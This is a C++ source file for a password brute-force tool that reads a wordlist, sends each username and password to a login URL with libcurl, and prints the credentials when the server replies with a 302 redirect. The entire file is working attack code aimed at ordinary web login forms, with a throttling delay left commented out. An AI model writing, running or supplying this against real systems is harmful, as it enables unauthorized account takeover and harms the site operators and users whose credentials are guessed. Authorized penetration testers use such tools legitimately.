#include "BruteForce.h"
#include <fstream>
#include <iostream>
#include <curl/curl.h>

void runBruteForce(const std::string& url, const std::string& username, const std::string& wordlistPath) {
    std::ifstream file(wordlistPath);
    std::string password;

    if (!file.is_open()) {
        std::cerr << "Failed to open password file: " << wordlistPath << std::endl;
        return;
    }

    CURL* curl = curl_easy_init();

    if (!curl) {
        std::cerr << "curl_easy_init() failed." << std::endl;
        return;
    }

    while (std::getline(file, password)) {
        std::string postData = "username=" + username + "&password=" + password;
        std::cout << "[*] Trying: " << password << std::endl;

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L); // don't follow redirects

        CURLcode res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        } else {
            long responseCode;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &responseCode);

            if (responseCode == 302) {
                std::cout << "[+] SUCCESS: " << username << ":" << password << std::endl;
                break;
            } else {
                std::cout << "[-] Failed: " << password << " (HTTP " << responseCode << ")" << std::endl;
            }
        }

        // Optional: small delay between attempts
        // std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    curl_easy_cleanup(curl);
}
